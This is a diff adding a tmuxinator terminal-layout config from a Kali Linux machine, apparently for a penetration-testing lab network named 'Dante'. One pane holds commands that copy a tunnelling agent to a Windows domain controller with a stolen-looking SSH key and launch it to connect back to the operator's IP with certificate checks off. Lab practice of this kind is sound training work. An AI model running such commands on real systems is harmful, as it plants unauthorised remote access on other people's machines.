@@ -1,0 +1,17 @@
+# /home/kali/.config/tmuxinator/dantePH2.yaml.yml
+
+name: dantePH2
+root: ~/
+startup_window: PH2DC01
+
+windows:
+
+  - PH2DC01:
+      root: ~/
+      layout: even-vertical
+      panes:
+        - DC01:
+          - cl
+          - cd Data/DC01-172.16.1.20
+          - scp -i id_rsa /home/kali/Desktop/WindowsTools/agent.exe katwamba@172.16.1.20:/C:/Windows/Temp/agent.exe
+          - ssh -i id_rsa katwamba@172.16.1.20 "C:/Windows/Temp/agent.exe -connect $myip:11601 -ignore-cert"
